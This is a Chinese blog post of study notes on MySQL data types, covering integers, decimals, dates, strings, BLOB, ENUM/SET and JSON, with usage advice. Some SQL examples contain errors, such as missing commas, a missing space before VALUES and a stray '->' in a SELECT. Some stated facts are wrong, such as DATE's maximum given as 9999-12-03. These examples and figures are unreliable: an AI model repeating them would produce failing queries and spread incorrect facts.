<p><strong>可选属性</strong>：<br>1.<code>M</code>: 表示显示宽度，M的取值范围是(0, 255)。例如，int(5)：当数据宽度小于5位的时候在数字前面需要用字符填满宽度。该项功能需要配合“ZEROFILL”使用，表示用“0”填满宽度，否则指定显示宽度无效,同时使用<code>zerofill</code>会在类型上自动添加<code>unsigned</code>。设置了显示宽度，不会对插入的数据有任何影响，还是按照类型的实际宽度进行保存，即<strong>显示宽度与类型可以存储的值范围无关</strong> 。从MySQL 8.0.17开始，整数数据类型<code>不推荐使用</code>显示宽度属性。整型数据类型可以在定义表结构时指定所需要的显示宽度，如果不指定，则系统为每一种类型指定默认的宽度值<br>2.<code>UNSIGNED</code>: 无符号类型（非负），所有的整数类型都有一个可选的属性UNSIGNED（无符号属性），无符号整数类型的最小取值为0。所以，如果需要在MySQL数据库中保存非负整数值时，可以将整数类型设置为无符号类型。int类型默认显示宽度为int(11)，无符号int类型默认显示宽度为int(10)</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>适用场景</th>
</tr>
</thead>
<tbody><tr>
<td>TINYINT</td>
<td>一般用于枚举数据，比如系统设定取值范围很小且固定的场景。</td>
</tr>
<tr>
<td>SMALLINT</td>
<td>可以用于较小范围的统计数据，比如统计工厂的固定资产库存数量等。</td>
</tr>
<tr>
<td>MEDIUMINT</td>
<td>用于较大整数的计算，比如车站每日的客流量等。</td>
</tr>
<tr>
<td>INT、INTEGER</td>
<td>取值范围足够大，一般情况下不用考虑超限问题，用得最多。比如商品编号。</td>
</tr>
<tr>
<td>BIGINT</td>
<td>只有当你处理特别巨大的整数时才会用到。比如双十一的交易量、大型门户网站点击量、证券公司衍生产品持仓等</td>
</tr>
</tbody></table>
<p><strong>使用建议：</strong></p>
<ol>
<li>考虑存储空间和可靠性的平衡</li>
<li>系统故障产生的成本远远超过增加几个字段存储空间所产生的成本。因此<strong>首先确保数据不会超过取值范围</strong></li>
</ol>
<p><strong>位</strong>类型</p>
<table>
<thead>
<tr>
<th>二进制字符串类型</th>
<th>长度</th>
<th>长度范围</th>
<th>占用空间</th>
</tr>
</thead>
<tbody><tr>
<td>BIT(M)</td>
<td>M</td>
<td>1&lt;&#x3D;M&lt;&#x3D;64</td>
<td>约为(M + 7)&#x2F;8个字节</td>
</tr>
</tbody></table>
<p>如果没有指定(M)，默认是1位。这个1位，表示只能存1位的二进制值。这里(M)是表示二进制的位数，位数最小值为1，最大值为64。通过<code>+0</code>可以转为十进制</p>
<h3 id="浮点型-和-定点数"><a href="#浮点型-和-定点数" class="headerlink" title="浮点型 和 定点数"></a>浮点型 和 定点数</h3><p><strong>浮点数FLOAT、DOUBLE–范围大</strong></p>
<p>包括：FLOAT、DOUBLE、REAL<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240805180348.png" alt="浮点型"></p>
<p>说明：</p>
<ol>
<li>浮点数有符号数的取值范围是无符号数的2倍，其在正数上的取值范围是一样的，这是由MySQL存储浮点数的格式导致的。<br>格式：<code>符号 尾数 阶码</code> 无论是否有符号，都必须存储表示符号的部分。因此<strong>浮点数不建议声明unsigned</strong></li>
<li>精度损失：MySQL允许使用非标准语法：FLOAT(M,D)或DOUBLE(M,D)。M称为精度，D称为标度。(M,D)中M&#x3D;整数位+小数<br>位，D&#x3D;小数位。D&lt;&#x3D;M&lt;&#x3D;255，0&lt;&#x3D;D&lt;&#x3D;30。从MySQL 8.0.17开始，FLOAT(M,D) 和DOUBLE(M,D)用法在官方文档中已经明确不推荐使用。不指定(M,D)时，默认会按照实际的精度。当整数部分超出了范围，报错，小数超出范围，四舍五入，若导致整数超出范围，报错。</li>
<li>因为浮点数是不准确的，所以我们要避免使用“&#x3D;”来判断两个数是否相等；同时，在要求高精度的数值时应当使用定点数。</li>
</ol>
<p><strong>定点数DECIMAL–精准</strong></p>
<p><strong>在要求高精度的数值时应当使用定点数</strong></p>
<p>|数据类型|字节数|含义|<br>|—-|—-|—-|—-|<br>|DECIMAL(M,D),DEC,NUMERIC|M+2字节|有效范围由M和D决定|</p>
<p>说明:</p>
<ol>
<li>DECIMAL(M,D)的最大取值范围与DOUBLE类型一样,底层利用字符串存储</li>
<li>不指定精度和标度时，其默认为DECIMAL(10,0)。当数据的精度超出了定点数类型的精度范围时，则MySQL同样会进行四舍五入处理。</li>
</ol>
<p><strong>浮点数 vs 定点数</strong></p>
<ul>
<li>浮点数相对于定点数的优点是在长度一定的情况下，浮点类型取值范围大，但是不精准，适用于需要取值范围大，又可以容忍微小误差的科学计算场景（比如计算化学、分子建模、流体动力学等）</li>
<li>定点数类型取值范围相对小，但是精准，没有误差，适合于对精度要求极高的场景 （比如涉及金额计算的场景）</li>
</ul>
<p>由于DECIMAL数据类型的精准性，在我们的<strong>项目中，除了极少数（比如商品编号）用到整数类型外，其他的数值都用的是 DECIMAL，原因就是这个项目所处的零售行业，要求精准，一分钱也不能差</strong>。</p>
<h3 id="日期时间类型"><a href="#日期时间类型" class="headerlink" title="日期时间类型"></a>日期时间类型</h3><table>
<thead>
<tr>
<th>类型</th>
<th>名称</th>
<th>字节</th>
<th>日期格式</th>
<th>最小值</th>
<th>最大值</th>
</tr>
</thead>
<tbody><tr>
<td>YEAR</td>
<td>年</td>
<td>1</td>
<td>YYYY或YY</td>
<td>1901</td>
<td>2155</td>
</tr>
<tr>
<td>TIME</td>
<td>时间</td>
<td>3</td>
<td>HH:MM:SS</td>
<td>-838:59:59</td>
<td>838:59:59</td>
</tr>
<tr>
<td>DATE</td>
<td>日期</td>
<td>3</td>
<td>YYYY-MM-DD</td>
<td>1000-01-01</td>
<td>9999-12-03</td>
</tr>
<tr>
<td>DATETIME</td>
<td>日期时间</td>
<td>8</td>
<td>YYYY-MM-DD<br>HH:MM:SS</td>
<td>1000-01-01<br>00:00:00</td>
<td>9999-12-31<br>23:59:59</td>
</tr>
<tr>
<td>TIMESTAMP</td>
<td>日期时间</td>
<td>4</td>
<td>YYYY-MM-DD<br>HH:MM:SS</td>
<td>1970-01-01<br>00:00:00 UTC</td>
<td>2038-01-19<br>03:14:07 UTC</td>
</tr>
</tbody></table>
<p><strong>开发建议</strong></p>
<p>用得最多的日期时间类型，就是 DATETIME 。虽然 MySQL 也支持 YEAR（年）、 TIME（时间）、DATE（日期），以及 TIMESTAMP 类型，但是在实际项目中，尽量用 DATETIME 类型。因为这个数据类型包括了完整的日期和时间信息，取值范围也最大，使用起来比较方便。毕竟，如果日期时间信息分散在好几个字段，很不容易记，而且查询的时候，SQL 语句也会更加复杂。此外，一般存注册时间、商品发布时间等，不建议使用DATETIME存储，而是使用<code>时间戳</code>，因为DATETIME虽然直观，但不便于计算</p>
<p>1、<code>YEAR</code>类型</p>
<ul>
<li>以4位字符串或数字格式表示YEAR类型，其格式为YYYY，最小值为1901，最大值为2155。</li>
<li>以2位字符串格式表示YEAR类型，最小值为00，最大值为99。<ul>
<li>当取值为01到69时，表示2001到2069；</li>
<li>当取值为70到99时，表示1970到1999；</li>
<li>当取值整数的0或00添加的话，那么是0000年；</li>
<li>当取值是日期&#x2F;字符串的’0’添加的话，是2000年<br>从MySQL5.5.27开始，2位格式的YEAR已经不推荐使用。YEAR默认格式就是“YYYY”，没必要写成YEAR(4)，<br>从MySQL 8.0.19开始，不推荐使用指定显示宽度的YEAR(4)数据类型，应当直接使用YEAR。</li>
</ul>
</li>
</ul>
<p>2、<code>DATE</code>类型</p>
<p>DATE类型表示日期，没有时间部分，格式为<code>YYYY-MM-DD</code>，其中，YYYY表示年份，MM表示月份，DD表示日期。在向DATE类型的字段插入数据时，同样需要满足一定的格式条件。以 YYYY-MM-DD 格式或者 YYYYMMDD 格式表示的字符串日期，其最小取值为1000-01-01，最大取值为9999-12-03。YYYYMMDD格式会被转化为YYYY-MM-DD格式。以 YY-MM-DD 格式或者 YYMMDD 格式表示的字符串日期，此格式中，年份为两位数值或字符串满足YEAR类型的格式条件为：当年份取值为00到69时，会被转化为2000到2069；当年份取值为70到99时，会被转化为1970到1999。</p>
<p>使用<code>CURRENT_DATE()</code> 或者<code>NOW()</code>函数，会插入当前系统的日期。</p>
<p>以下方法均可插入日期数据，但推荐使用第一种<code>YYYY-MM-DD</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test_date <span class="keyword">value</span>(<span class="string">&#x27;2001-10-11&#x27;</span>),(<span class="string">&#x27;20011011&#x27;</span>),(<span class="number">20011011</span>),(<span class="string">&#x27;01-10-11&#x27;</span>),(<span class="string">&#x27;011011&#x27;</span>),(<span class="number">011011</span>);</span><br></pre></td></tr></table></figure>

<p>3、<code>TIME</code>类型</p>
<p>TIME类型用来表示时间，没有日期部分，格式为<code>HH:MM:SS</code>，其中，HH表示小时，MM表示分钟，SS表示秒。向TIME类型的字段插入数据时，也可以使用几种不同的格式。<br>（1）可以使用带有冒号的字符串，比如’D HH:MM:SS’、’HH:MM:SS’、’HH:MM’、’D HH:MM’、’D HH’或’SS’格式，都能被正确地插入TIME类型的字段中。其中D表示天，其最小值为0，最大值为34。如果使用带有D格式的字符串插入TIME类型的字段时，D会被转化为小时，计算格式为D*24+HH。当使用带有冒号并且不带D的字符串表示时间时，表示当天的时间，比如12:10表示12:10:00，而不是00:12:10。<br>（2）可以使用不带有冒号的字符串或者数字，格式为’HHMMSS’或者 HHMMSS 。如果插入一个不合法的字符串或者数字，MySQL在存储数据时，会将其自动转化为00:00:00进行存储。比如1210，MySQL会将最右边的两位解析成秒，表示00:12:10，而不是12:10:00。<br>（3）使用<code>CURRENT_TIME()</code>或者<code>NOW()</code>，会插入当前系统的时间。</p>
<p>以下方法均可插入时间数据，但推荐使用第一种<code>D HH:MM:SS</code>或<code>HH:MM:SS</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test_time <span class="keyword">value</span>(<span class="string">&#x27;1 12:11:13&#x27;</span>),(<span class="string">&#x27;12:11:13&#x27;</span>),(<span class="string">&#x27;12:11&#x27;</span>),(<span class="string">&#x27;1 12:11&#x27;</span>),(<span class="string">&#x27;1 12&#x27;</span>),(<span class="string">&#x27;13&#x27;</span>)(<span class="string">&#x27;121113&#x27;</span>)(<span class="number">1113</span>);</span><br></pre></td></tr></table></figure>

<p>4、<code>DATETIME</code>类型<strong>使用较多</strong></p>
<p>DATETIME类型在格式上为DATE类型和TIME类型的组合,8字节，可以表示为<code>YYYY-MM-DD HH:MM:SS</code>，其中YYYY表示年份，MM表示月份，DD表示日期，HH表示小时，MM表示分钟，SS表示秒。在向DATETIME类型的字段插入数据时，同样需要满足一定的格式条件。以 YYYY-MM-DD HH:MM:SS 格式或者 YYYYMMDDHHMMSS 格式的字符串插入DATETIME类型的字段时，</p>
<ul>
<li>以YYYYMMDDHHMMSS格式的数字插入DATETIME类型的字段时，会被转化为YYYY-MM-DD HH:MM:SS格式。</li>
<li>以 YY-MM-DD HH:MM:SS 格式或者 YYMMDDHHMMSS 格式的字符串插入DATETIME类型的字段时，两位数的年份规则符合YEAR类型的规则，00到69表示2000到2069；70到99表示1970到1999。<br>使用函数<code>CURRENT_TIMESTAMP()</code>和<code>NOW()</code>，可以向DATETIME类型的字段插入系统的当前日期和时间。</li>
</ul>
<p>以下方法均可插入日期时间数据，但推荐使用第一种<code>YYYY-MM-DD HH:MM:SS</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test_time <span class="keyword">value</span>(<span class="string">&#x27;2001-10-01 01:10:10&#x27;</span>),(<span class="string">&#x27;20011001011010&#x27;</span>),(<span class="string">&#x27;011001011010&#x27;</span>),(<span class="string">&#x27;01-10-01 01:10:10&#x27;</span>),(<span class="number">20011001011010</span>);</span><br></pre></td></tr></table></figure>

<p>5、<code>TIMESTAMP</code>类型<br>TIMESTAMP也可以表示日期时间，其显示格式与DATETIME类型相同，都是 YYYY-MM-DD HH:MM:SS ，4字节。但是TIMESTAMP存储的时间范围比DATETIME要小很多，只能存储“1970-01-01 00:00:01 UTC”到“2038-01-19 03:14:07 UTC”之间的时间。其中，UTC表示世界统一时间，也叫作世界标准时间。存储数据的时候需要对当前时间所在的时区进行转换，查询数据的时候再将时间转换回当前的时区。因此，<strong>使用TIMESTAMP存储的同一个时间值，在不同的时区查询时会显示不同的时间</strong>。向TIMESTAMP类型的字段插入数据时，当插入的数据格式满足YY-MM-DD HH:MM:SS和YYMMDDHHMMSS时，两位数值的年份同样符合YEAR类型的规则条件，只不过表示的时间范围要小很多。如果向TIMESTAMP类型的字段插入的时间超出了TIMESTAMP类型的范围，则MySQL会抛出错误信息</p>
<p><strong>TIMESTAMP和DATETIME的区别</strong>：</p>
<ol>
<li>TIMESTAMP存储空间比较小，表示的日期时间范围也比较小</li>
<li>底层存储方式不同，TIMESTAMP底层存储的是毫秒值，距离1970-1-1 0:0:0 0毫秒的毫秒值。</li>
<li>两个日期比较大小或日期计算时，TIMESTAMP更方便、更快。</li>
<li>TIMESTAMP和时区有关。TIMESTAMP会根据用户的时区不同，显示不同的结果。而DATETIME则只能反映出插入时当地的时区，其他时区的人查看数据必然会有误差的。</li>
</ol>
<h3 id="文本字符串类型"><a href="#文本字符串类型" class="headerlink" title="文本字符串类型"></a>文本字符串类型</h3><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240805215016.png" alt="文本字符串类型"></p>
<h4 id="VARCHAR和CHAR"><a href="#VARCHAR和CHAR" class="headerlink" title="VARCHAR和CHAR"></a>VARCHAR和CHAR</h4><p>CHAR和VARCHAR类型都可以存储比较短的字符串。</p>
<table>
<thead>
<tr>
<th>字符串(文本)类型</th>
<th>特点</th>
<th>长度</th>
<th>长度范围</th>
<th>占用的存储空间</th>
</tr>
</thead>
<tbody><tr>
<td>CHAR(M)</td>
<td>固定长度</td>
<td>M</td>
<td>0&lt;&#x3D;M&lt;&#x3D;255</td>
<td>M个字节</td>
</tr>
<tr>
<td>VARCHAR(M)</td>
<td>可变长度</td>
<td>M</td>
<td>0&lt;&#x3D;M&lt;&#x3D;65535</td>
<td>(实际长度+1)个字节</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>类型</th>
<th>特点</th>
<th>空间上</th>
<th>时间上</th>
<th>适用场景</th>
</tr>
</thead>
<tbody><tr>
<td>CHAR(M)</td>
<td>固定长度</td>
<td>浪费存储空间</td>
<td>效率高</td>
<td>存储不大，速度要求高</td>
</tr>
<tr>
<td>VARCHAR(M)</td>
<td>可变长度</td>
<td>节省存储空间</td>
<td>效率低</td>
<td>非CHAR的情况</td>
</tr>
</tbody></table>
<p><strong>使用建议</strong></p>
<ol>
<li>存储很短的信息应该用char，因为varchar还要占个byte用于存储信息长度，本来打算节约存储的，结果得不偿失。</li>
<li>固定长度的应该用char更合适。</li>
<li>十分频繁改变的column应该用char，避免计算长度</li>
<li>InnoDB存储引擎最好用varchar，MYISAM建议使用char，MEMORY无所谓<br>因为对于InnoDB数据表，内部的行存储格式并没有区分固定长度和可变长度列（所有数据行都使用指向数据列值的头指针），而且主要影响性能的因素是数据行使用的存储总量，由于char平均占用的空间多于varchar，所以除了简短并且固定长度的，其他考虑varchar。这样节省空间，对磁盘I&#x2F;O和数据存储总量比较好</li>
</ol>
<p>CHAR类型：<br>CHAR(M)类型一般需要预先定义字符串长度。如果不指定(M)，则表示长度默认是1个字符。如果保存时，数据的实际长度比CHAR类型声明的长度小，则会在右侧填充空格以达到指定的长度。当MySQL检索CHAR类型的数据时，CHAR类型的字段会去除尾部的空格。定义CHAR类型字段时，声明的字段长度即为CHAR类型字段所占的存储空间的字节数。</p>
<p>VARCHAR类型：<br>VARCHAR(M)定义时，必须指定长度M，否则报错。</p>
<ul>
<li>MySQL4.0版本以下，varchar(20)：指的是20字节，如果存放UTF8汉字时，只能存6个（每个汉字3字节）；</li>
<li>MySQL5.0版本以上，varchar(20)：指的是20字符，因此存放M必须小于21845<br>检索VARCHAR类型的字段数据时，会保留数据尾部的空格。VARCHAR类型的字段所占用的存储空间为字符串实际长度加1个字节</li>
</ul>
<h4 id="TEXT类型"><a href="#TEXT类型" class="headerlink" title="TEXT类型"></a>TEXT类型</h4><table>
<thead>
<tr>
<th>文本字符串类型</th>
<th>特点</th>
<th>长度</th>
<th>长度范围</th>
<th>占用的存储空间</th>
</tr>
</thead>
<tbody><tr>
<td>TINYTEXT</td>
<td>小文本、可变长度</td>
<td>L</td>
<td>0&lt;&#x3D;L&lt;&#x3D;255</td>
<td>L+2个字节</td>
</tr>
<tr>
<td>TEXT</td>
<td>文本、可变长度</td>
<td>L</td>
<td>0&lt;&#x3D;L&lt;&#x3D;65535</td>
<td>L+2个字节</td>
</tr>
<tr>
<td>MEDIUMTEXT</td>
<td>中等文本、可变长度</td>
<td>L</td>
<td>0&lt;&#x3D;L&lt;&#x3D;16777215</td>
<td>L+3个字节</td>
</tr>
<tr>
<td>LONGTEXT</td>
<td>大文本、可变长度</td>
<td>L</td>
<td>0&lt;&#x3D;L&lt;&#x3D;4294967295（相当于4GB）</td>
<td>L+4个字节</td>
</tr>
</tbody></table>
<p><strong>开发建议</strong></p>
<p>TEXT文本类型，可以<strong>存比较大的文本段</strong>，搜索速度稍慢，因此如果不是特别大的内容，建议使用CHAR，VARCHAR来代替。还有TEXT类型不用加默认值，加了也没用。而且text和blob类型的数据删除后容易导致“空洞”，使得文件碎片比较多，所以<strong>频繁使用的表不建议包含TEXT类型字段</strong>，建议单独<strong>分出去</strong>，单独用一个表。</p>
<h3 id="二进制字符串数据-了解"><a href="#二进制字符串数据-了解" class="headerlink" title="二进制字符串数据(了解)"></a>二进制字符串数据(了解)</h3><p>可以存储图片、音频和视频等二进制数据。</p>
<h4 id="BINARY和VARBINARY"><a href="#BINARY和VARBINARY" class="headerlink" title="BINARY和VARBINARY"></a>BINARY和VARBINARY</h4><table>
<thead>
<tr>
<th>二进制字符串类型</th>
<th>特点</th>
<th>值的长度</th>
<th>占用空间</th>
</tr>
</thead>
<tbody><tr>
<td>BINARY(M)</td>
<td>固定长度</td>
<td>M</td>
<td>（0&lt;&#x3D;M&lt;&#x3D;255）</td>
</tr>
<tr>
<td>VARBINARY(M)</td>
<td>可变长度</td>
<td>M（0&lt;&#x3D;M&lt;&#x3D;65535）</td>
<td>M+1个字</td>
</tr>
</tbody></table>
<p>BINARY和VARBINARY类似于CHAR和VARCHAR，但它们存储的是二进制字符串。</p>
<ul>
<li>BINARY(M)为固定长度的二进制字符串，M表示最多能存储的字节数，取值范围是0~255个字符。如果未指定(M)，表示只能存储1个字节 。例如BINARY(8)，表示最多能存储8个字节，如果字段值不足(M)个字节，将在右边填充’\0’以补齐指定长度。</li>
<li>VARBINARY (M)为可变长度的二进制字符串，M表示最多能存储的字节数，总字节数不能超过行的字节长度限制65535，另外还要考虑额外字节开销，VARBINARY类型的数据除了存储数据本身外，还需要1或2个字节来存储数据的字节数。VARBINARY类型必须指定(M)，否则报错。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 建表和使用示例</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> test_binary1(f1 <span class="type">BINARY</span>,f2 <span class="type">BINARY</span>(<span class="number">3</span>),f4 <span class="type">VARBINARY</span>(<span class="number">10</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> test_binary1(f1,f2)<span class="keyword">VALUES</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)；</span><br></pre></td></tr></table></figure>


<h4 id="BLOB类型"><a href="#BLOB类型" class="headerlink" title="BLOB类型"></a>BLOB类型</h4><p>BLOB是一个 二进制大对象,类似text，可以容纳可变数量的数据。MySQL中的BLOB类型包括TINYBLOB、BLOB、MEDIUMBLOB和LONGBLOB 4种类型，它们可容纳值的最大长度不同。可以存储一个二进制的大对象，比如图片、音频和视频等。需要注意的是，在实际工作中，往往不会在MySQL数据库中使用BLOB类型存储大对象数据，通常会将图片、音频和视频文件存储到 服务器的磁盘上，并将图片、音频和视频的访问路径存储到MySQL中。</p>
<table>
<thead>
<tr>
<th>二进制字符串类型</th>
<th>值的长度</th>
<th>长度范围</th>
<th>占用空间</th>
</tr>
</thead>
<tbody><tr>
<td>TINYBLOB</td>
<td>L</td>
<td>0&lt;&#x3D;L&lt;&#x3D;255</td>
<td>L+1个字节</td>
</tr>
<tr>
<td>BLOB</td>
<td>L</td>
<td>0&lt;&#x3D;L&lt;&#x3D;65535（相当于64KB）</td>
<td>L+2个字节</td>
</tr>
<tr>
<td>MEDIUMBLOB</td>
<td>L</td>
<td>0&lt;&#x3D;L&lt;&#x3D;16777215</td>
<td>（相当于16MB）</td>
</tr>
<tr>
<td>LONGBLOB</td>
<td>L</td>
<td>0&lt;&#x3D;L&lt;&#x3D;4294967295（相当于4GB）</td>
<td>L+4个字节</td>
</tr>
</tbody></table>
<p><strong>TEXT和BLOB的使用注意事项：</strong></p>
<ol>
<li>BLOB和TEXT值也会引起自己的一些问题，特别是执行了大量的删除或更新操作的时候。删除这种值会在数据表中留下很大的”空洞”，以后填入这些”空洞”的记录可能长度不同。为了提高性能，建议定期使用<code>OPTIMIZE TABLE</code>功能对这类表进行碎片整理 。</li>
<li>如果需要对大文本字段进行模糊查询，MySQL 提供了<code>前缀索引</code>。但是仍然要在不必要的时候避免检索大型的BLOB或TEXT值。例如，SELECT * 查询就不是很好的想法，除非你能够确定作为约束条件的WHERE子句只会找到所需要的数据行。否则，你可能毫无目的地在网络上传输大量的值。</li>
<li>把BLOB或TEXT列 <code>分离到单独的表</code>中。在某些环境中，如果把这些数据列移动到第二张数据表中，可以让你把原数据表中的数据列转换为固定长度的数据行格式，那么它就是有意义的。这会<code>减少主表中的碎片</code>，使你得到固定长度数据行的性能优势。它还使你在主数据表上运行 SELECT * 查询的时候不会通过网络传输大量的BLOB或TEXT值。</li>
</ol>
<h3 id="ENUM枚举和SET集合"><a href="#ENUM枚举和SET集合" class="headerlink" title="ENUM枚举和SET集合"></a>ENUM枚举和SET集合</h3><p><strong>ENUM</strong></p>
<p>ENUM类型也叫作枚举类型，ENUM类型的取值范围需要在定义字段时进行指定。设置字段值时，ENUM类型只允许从成员中<strong>选取单个</strong>值，不能一次选取多个值。</p>
<table>
<thead>
<tr>
<th>文本字符串类型</th>
<th>长度</th>
<th>长度范围</th>
<th>占用的存储空间</th>
</tr>
</thead>
<tbody><tr>
<td>ENUM</td>
<td>L</td>
<td>1&lt;&#x3D;L&lt;&#x3D;65535</td>
<td>1或2个字节</td>
</tr>
</tbody></table>
<p>其所需要的存储空间由定义ENUM类型时指定的成员个数决定，上限为65535个。</p>
<ul>
<li>当ENUM类型包含1～255个成员时，需要1个字节的存储空间；</li>
<li>当ENUM类型包含256～65535个成员时，需要2个字节的存储空间。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 建表时字段声明示例</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> test_enum(season ENUM(<span class="string">&#x27;春&#x27;</span>,<span class="string">&#x27;夏&#x27;</span>,<span class="string">&#x27;秋&#x27;</span>,<span class="string">&#x27;冬&#x27;</span>,<span class="string">&#x27;unknow&#x27;</span>));</span><br><span class="line"><span class="comment">-- 数据添加示例，windows下数据同样忽略大小写</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> test_enum <span class="keyword">VALUES</span>(<span class="string">&#x27;春&#x27;</span>),(<span class="string">&#x27;秋&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> test_enumVALUES(<span class="string">&#x27;1&#x27;</span>),(<span class="number">3</span>);</span><br><span class="line"><span class="comment">-- 没有限制时可以添加null</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> test_enumVALUES(<span class="keyword">NULL</span>);</span><br></pre></td></tr></table></figure>


<p><strong>SET</strong></p>
<p>SET表示一个字符串对象，可以包含0个或多个成员，但成员个数的上限为64。设置字段值时，可以取 取值范围内的<strong>0个或多个值</strong>。当SET类型包含的成员个数不同时，其所占用的存储空间也是不同的，具体如下：</p>
<table>
<thead>
<tr>
<th>成员个数范围（L表示实际成员个数）</th>
<th>占用的存储空间</th>
</tr>
</thead>
<tbody><tr>
<td>1&lt;&#x3D;L&lt;&#x3D;8</td>
<td>1个字节</td>
</tr>
<tr>
<td>9&lt;&#x3D;L&lt;&#x3D;16</td>
<td>2个字节</td>
</tr>
<tr>
<td>17&lt;&#x3D;L&lt;&#x3D;24</td>
<td>3个字节</td>
</tr>
<tr>
<td>25&lt;&#x3D;L&lt;&#x3D;32</td>
<td>4个字节</td>
</tr>
<tr>
<td>33&lt;&#x3D;L&lt;&#x3D;64</td>
<td>8个字节</td>
</tr>
</tbody></table>
<p>SET类型在存储数据时成员个数越多，其占用的存储空间越大。注意：SET类型在选取成员时，可以一次选择多个成员，这一点与ENUM类型不同。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 建表时字段声明示例</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> test_set(s <span class="keyword">SET</span> (<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>));</span><br><span class="line"><span class="comment">-- 数据添加示例，插入重复的SET类型成员时，MySQL会自动删除重复的成员</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> test_set (s) <span class="keyword">VALUES</span> (<span class="string">&#x27;A&#x27;</span>), (<span class="string">&#x27;A,B&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> test_set (s) <span class="keyword">VALUES</span> (<span class="string">&#x27;A,B,C,A&#x27;</span>)</span><br><span class="line"><span class="comment">-- 插入SET成员中不存在的值时，MySQL会抛出错误。</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> test_set (s) <span class="keyword">VALUES</span> (<span class="string">&#x27;A,B,C,D&#x27;</span>)</span><br></pre></td></tr></table></figure>


<h3 id="JSON类型"><a href="#JSON类型" class="headerlink" title="JSON类型"></a>JSON类型</h3><p>JSON（JavaScript Object Notation）是一种轻量级的数据交换格式。简洁和清晰的层次结构使得JSON成为理想的数据交换语言。它易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率。JSON 可以将 JavaScript 对象中表示的一组数据转换为字符串，然后就可以在网络或者程序之间轻松地传递这个字符串，并在需要的时候将它还原为各编程语言所支持的数据格式。<br>在MySQL 5.7中，就已经支持JSON数据类型。在MySQL 8.x版本中，JSON类型提供了可以进行自动验证的JSON文档和优化的存储结构，使得在MySQL中存储和读取JSON类型的数据更加方便和高效。</p>
<p>使用示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 建表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> test_json(js json);</span><br><span class="line"><span class="comment">-- 数据插入</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> test_json (js)<span class="keyword">VALUES</span> (<span class="string">&#x27;&#123;&quot;name&quot;:&quot;songhk&quot;, &quot;age&quot;:18, &quot;address&quot;:&#123;&quot;province&quot;:&quot;beijing&quot;,&quot;city&quot;:&quot;beijing&quot;&#125;&#125;&#x27;</span>);</span><br><span class="line"><span class="comment">-- 当需要检索JSON类型的字段中数据的某个具体值时，可以使用“-&gt;”和“-&gt;&gt;”符号。</span></span><br><span class="line"><span class="keyword">SELECT</span> js <span class="operator">-</span><span class="operator">&gt;</span> <span class="string">&#x27;$.name&#x27;</span> <span class="keyword">AS</span> NAME,js <span class="operator">-</span><span class="operator">&gt;</span> <span class="string">&#x27;$.age&#x27;</span> <span class="keyword">AS</span> age ,js <span class="operator">-</span><span class="operator">&gt;</span> <span class="string">&#x27;$.address.province&#x27;</span> <span class="keyword">AS</span> province, js <span class="operator">-</span><span class="operator">&gt;</span> <span class="string">&#x27;$.address.city&#x27;</span> <span class="keyword">AS</span> city <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> test_json;</span><br><span class="line"><span class="comment">-- | NAME | age | province | city |</span></span><br><span class="line"><span class="comment">-- | &quot;songhk&quot; | 18 | &quot;beijing&quot; | &quot;beijing&quot; |</span></span><br></pre></td></tr></table></figure>

<h3 id="空间数据类型"><a href="#空间数据类型" class="headerlink" title="空间数据类型"></a>空间数据类型</h3><p>待今后使用补充</p>
<h3 id="类型选择建议"><a href="#类型选择建议" class="headerlink" title="类型选择建议"></a>类型选择建议</h3><p>在定义数据类型时，如果确定是整数，就用INT； 如果是小数，一定用定点数类型DECIMAL(M,D)；如果是日期与时间，就用 DATETIME。这样做的好处是，首先确保你的系统不会因为数据类型定义出错。不过，凡事都是有两面的，可靠性好，并不意味着高效。比如，TEXT 虽然使用方便，但是效率不如 CHAR(M) 和 VARCHAR(M)。</p>
<p><strong>阿里巴巴《Java开发手册》之MySQL数据库：</strong></p>
<ol>
<li>任何字段如果为非负数，必须是<code>UNSIGNED</code></li>
<li>【强制】小数类型为<code>DECIMAL</code>，禁止使用<code>FLOAT</code>和<code>DOUBLE</code>。<br>说明：在存储的时候，<code>FLOAT</code>和<code>DOUBLE</code>都存在精度损失的问题，很可能在比较值的时候，得到不正确的结果。如果存储的数据范围超过<code>DECIMAL</code>的范围，建议将数据拆成整数和小数并分开存储。</li>
<li>【强制】如果存储的字符串长度几乎相等，使用<code>CHAR</code>定长字符串类型。</li>
